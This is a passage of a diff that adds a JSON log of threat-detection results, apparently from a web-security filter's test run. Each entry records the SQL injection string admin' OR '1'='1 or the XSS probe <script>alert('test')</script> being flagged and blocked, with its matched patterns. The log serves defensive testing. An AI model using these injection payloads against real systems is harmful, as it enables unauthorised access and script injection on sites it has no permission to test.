+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:13.207581+00:00"
+    },
+    {
+      "id": "threat_1762480575_61",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:15.297699+00:00"
+    },
+    {
+      "id": "threat_1762480575_62",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:15.361246+00:00"
+    },
+    {
+      "id": "threat_1762480577_63",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:17.556153+00:00"
+    },
+    {
+      "id": "threat_1762480577_64",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:17.646555+00:00"
+    },
+    {
+      "id": "threat_1762480580_65",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:20.069536+00:00"
+    },
+    {
+      "id": "threat_1762480580_66",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:20.135634+00:00"
+    },
+    {
+      "id": "threat_1762480582_67",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:22.692316+00:00"
+    },
+    {
+      "id": "threat_1762480583_68",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:23.286210+00:00"
+    },
+    {
+      "id": "threat_1762480583_69",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:23.575753+00:00"
+    },
+    {
+      "id": "threat_1762480583_70",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:23.645305+00:00"
+    },
+    {
+      "id": "threat_1762480586_71",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:26.356608+00:00"
+    },
+    {
+      "id": "threat_1762480586_72",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:26.511470+00:00"
+    },
+    {
+      "id": "threat_1762480588_73",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:28.579603+00:00"
+    },
+    {
+      "id": "threat_1762480588_74",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:28.650185+00:00"
+    },
+    {
+      "id": "threat_1762480592_75",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:32.332028+00:00"
+    },
+    {
+      "id": "threat_1762480592_76",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:32.414515+00:00"
+    },
+    {
+      "id": "threat_1762480593_77",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:33.869688+00:00"
+    },
+    {
+      "id": "threat_1762480594_78",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:34.026912+00:00"
+    },
+    {
+      "id": "threat_1762480597_79",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:37.007960+00:00"
+    },
+    {
+      "id": "threat_1762480597_80",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:37.070351+00:00"
+    },
+    {
+      "id": "threat_1762480600_81",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:40.222539+00:00"
+    },
+    {
+      "id": "threat_1762480600_82",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:40.390040+00:00"
+    },
+    {
+      "id": "threat_1762480602_83",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:42.837184+00:00"
+    },
+    {
+      "id": "threat_1762480602_84",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:42.902518+00:00"
+    },
+    {
+      "id": "threat_1762480606_85",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:46.131998+00:00"
+    },
+    {
+      "id": "threat_1762480606_86",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:46.209132+00:00"
+    },
+    {
+      "id": "threat_1762480609_87",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:49.587456+00:00"
+    },
+    {
+      "id": "threat_1762480609_88",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:49.662234+00:00"
+    },
+    {
+      "id": "threat_1762480613_89",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:53.313865+00:00"
+    },
+    {
+      "id": "threat_1762480613_90",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:53.391241+00:00"
+    },
+    {
+      "id": "threat_1762480617_91",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:57.136940+00:00"
+    },
+    {
+      "id": "threat_1762480617_92",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:57.257332+00:00"
+    },
+    {
+      "id": "threat_1762480621_93",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:01.220558+00:00"
+    },
+    {
+      "id": "threat_1762480621_94",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:01.310346+00:00"
+    },
+    {
+      "id": "threat_1762480625_95",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:05.358856+00:00"
+    },
+    {
+      "id": "threat_1762480625_96",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:05.424148+00:00"
+    },
+    {
+      "id": "threat_1762480629_97",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:09.239786+00:00"
+    },
+    {
+      "id": "threat_1762480632_98",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:12.513863+00:00"
+    },
+    {
+      "id": "threat_1762480632_99",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:12.673634+00:00"
+    },
+    {
+      "id": "threat_1762480632_100",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:12.821706+00:00"
+    },
+    {
+      "id": "threat_1762480633_101",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:13.827296+00:00"
+    },
+    {
+      "id": "threat_1762480635_102",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:15.943008+00:00"
+    },
+    {
+      "id": "threat_1762480636_103",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:16.246560+00:00"
+    },
+    {
+      "id": "threat_1762480638_104",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:18.351245+00:00"
+    },
+    {
+      "id": "threat_1762480638_105",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:18.676649+00:00"
+    },
+    {
+      "id": "threat_1762480638_106",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:18.743988+00:00"
+    },
+    {
+      "id": "threat_1762480643_107",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:23.163139+00:00"
+    },
+    {
+      "id": "threat_1762480643_108",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:23.255465+00:00"
+    },
+    {
+      "id": "threat_1762480647_109",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:27.659889+00:00"
+    },
+    {
+      "id": "threat_1762480647_110",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:27.728542+00:00"
+    },
+    {
+      "id": "threat_1762480652_111",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:32.825707+00:00"
+    },
+    {
+      "id": "threat_1762480652_112",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:32.910351+00:00"
+    },
+    {
+      "id": "threat_1762480657_113",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:37.511611+00:00"
+    },
+    {
+      "id": "threat_1762480657_114",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:37.592023+00:00"
+    },
+    {
+      "id": "threat_1762480663_115",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:43.495285+00:00"
+    },
+    {
+      "id": "threat_1762480663_116",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:43.644889+00:00"
+    },
+    {
+      "id": "threat_1762480666_117",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:46.010177+00:00"
+    },
+    {
+      "id": "threat_1762480669_118",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:49.756348+00:00"
+    },
+    {
+      "id": "threat_1762480669_119",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:49.909163+00:00"
+    },
+    {
+      "id": "threat_1762480671_120",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:51.180471+00:00"
+    },
+    {
+      "id": "threat_1762480671_121",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
